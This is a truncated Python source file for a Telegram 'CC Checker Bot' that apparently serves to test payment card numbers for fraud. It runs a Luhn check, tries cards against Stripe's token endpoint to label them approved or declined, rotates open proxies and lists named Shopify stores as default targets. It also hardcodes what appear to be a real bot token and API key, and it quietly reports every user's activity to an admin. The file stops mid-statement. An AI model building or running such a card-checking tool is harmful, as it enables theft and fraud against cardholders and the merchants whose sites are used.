#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import logging
import re
import requests
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN","8497098081:AAFNQzwZxn-7vhTnR0d5fEUmvzDuQ4UEpGk")
ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID","729412805"))
BINCODES_API_KEY = os.getenv("BINCODES_API_KEY","425be7cdecc63d7a92ebe8e9bc6773a0")
BOT_VERSION = "3.0"

if not TELEGRAM_BOT_TOKEN:
    logger.error("TELEGRAM_BOT_TOKEN environment variable missing")
    sys.exit(1)
if not BINCODES_API_KEY:
    logger.error("BINCODES_API_KEY environment variable missing")
    sys.exit(1)

user_api_keys = {}
user_proxies = {}
user_sites = {}
user_activity_log = []

DEFAULT_PROXIES = [
    "103.152.112.162:80",
    "190.61.41.106:999",
    "185.217.143.96:80"
]

DEFAULT_SHOPIFY_SITES = [
    "https://cnocoutdoors.com",
    "https://southernrootscoffee.com",
    "https://championtrophies.com",
    "https://kingdomcomecards.com"
]


def is_admin(user_id):
    return user_id == ADMIN_USER_ID


def notify_admin(bot, message):
    try:
        bot.send_message(chat_id=ADMIN_USER_ID, text=message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed admin notify: {e}")


def log_activity(bot, user_id, username, action, details="", sensitive=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_activity_log.append({
        "timestamp": timestamp,
        "user_id": user_id,
        "username": username,
        "action": action,
        "details": details,
        "sensitive": sensitive
    })
    msg = f"*User Activity*\n\nUser: @{username}\nID: `{user_id}`\nAction: {action}\nDetails: {details}\nTime: {timestamp}"
    notify_admin(bot, msg)

def get_user_keys(user_id):
    return user_api_keys.get(user_id, {
        "stripe": None,
        "paypal_id": None,
        "paypal_secret": None,
        "razorpay_id": None,
        "razorpay_secret": None
    })

def set_user_key(user_id, gateway, key_type, value):
    if user_id not in user_api_keys:
        user_api_keys[user_id] = {}
    if gateway == "stripe":
        user_api_keys[user_id]["stripe"] = value
    elif gateway == "paypal":
        if key_type == "id":
            user_api_keys[user_id]["paypal_id"] = value
        elif key_type == "secret":
            user_api_keys[user_id]["paypal_secret"] = value
    elif gateway == "razorpay":
        if key_type == "id":
            user_api_keys[user_id]["razorpay_id"] = value
        elif key_type == "secret":
            user_api_keys[user_id]["razorpay_secret"] = value

def add_user_proxy(user_id, proxy):
    proxies = user_proxies.setdefault(user_id, DEFAULT_PROXIES[:])
    if proxy not in proxies:
        proxies.append(proxy)
        return True
    return False

def get_user_proxies(user_id):
    return user_proxies.get(user_id, DEFAULT_PROXIES[:])

def add_user_site(user_id, site):
    sites = user_sites.setdefault(user_id, DEFAULT_SHOPIFY_SITES[:])
    if site not in sites:
        sites.append(site)
        return True
    return False

def get_user_sites(user_id):
    return user_sites.get(user_id, DEFAULT_SHOPIFY_SITES[:])

def luhn_check(card_number):
    digits = [int(d) for d in card_number]
    checksum = 0
    oddeven = len(digits) & 1
    for count in range(len(digits)):
        digit = digits[count]
        if not ((count & 1) ^ oddeven):
            digit = digit * 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return (checksum % 10) == 0

def check_stripe(card, stripe_key):
    if not stripe_key:
        return {'status': 'error', 'message': 'Set Stripe key first via /setstripekey'}
    url = "https://api.stripe.com/v1/tokens"
    data = {
        "card[number]": card["card_number"],
        "card[exp_month]": card["exp_month"],
        "card[exp_year]": card["exp_year"],
        "card[cvc]": card["cvv"]
    }
    headers = {
        "Authorization": f"Bearer {stripe_key}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        resp = requests.post(url, data=data, headers=headers, timeout=15)
        resp_json = resp.json()
        if resp.status_code == 200 and "id" in resp_json:
            return {"status": "approved", "message": "Valid card"}
        elif resp.status_code == 402:
            return {"status": "declined", "message": "Card declined"}
        elif resp.status_code == 401:
            return {"status": "error", "message": "Invalid Stripe Key"}
        else:
            return {"status": "error", "message": resp_json.get("error", {}).get("message", "Declined")}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def start(update, context):
    user = update.effective_user
    log_activity(context.bot, user.id, user.username or "Unknown", "Started Bot")
    if user.id not in user_proxies:
        user_proxies[user.id] = DEFAULT_PROXIES[:]
    if user.id not in user_sites:
        user_sites[user.id] = DEFAULT_SHOPIFY_SITES[:]

    keyboard = [
        [InlineKeyboardButton("Set Keys", callback_data="keys"), InlineKeyboardButton("Commands", callback_data="commands")],
        [InlineKeyboardButton("Proxies", callback_data="proxies"), InlineKeyboardButton("Sites", callback_data="sites")],
        [InlineKeyboardButton("Check Card", callback_data="check"), InlineKeyboardButton("BIN Lookup", callback_data="bin")]
    ]
    if is_admin(user.id):
        keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin")])

    update.message.reply_text(
        f"*CC Checker Bot v{BOT_VERSION}*\nWelcome {user.first_name}!\nID: `{user.id}`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def button_callback(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    if data == "keys":
        query.message.reply_text("You clicked: Set Keys")
    elif data == "commands":
        query.message.reply_text("You clicked: Commands")
    elif data == "proxies":
        query.message.reply_text("You clicked: Proxies")
    elif data == "sites":
        query.message.reply_text("You clicked: Sites")
    elif data == "check":
        query.message.reply_text("You clicked: Check Card")
    elif data == "bin":
        query.message.reply_text("You clicked: BIN Lookup")
    elif data


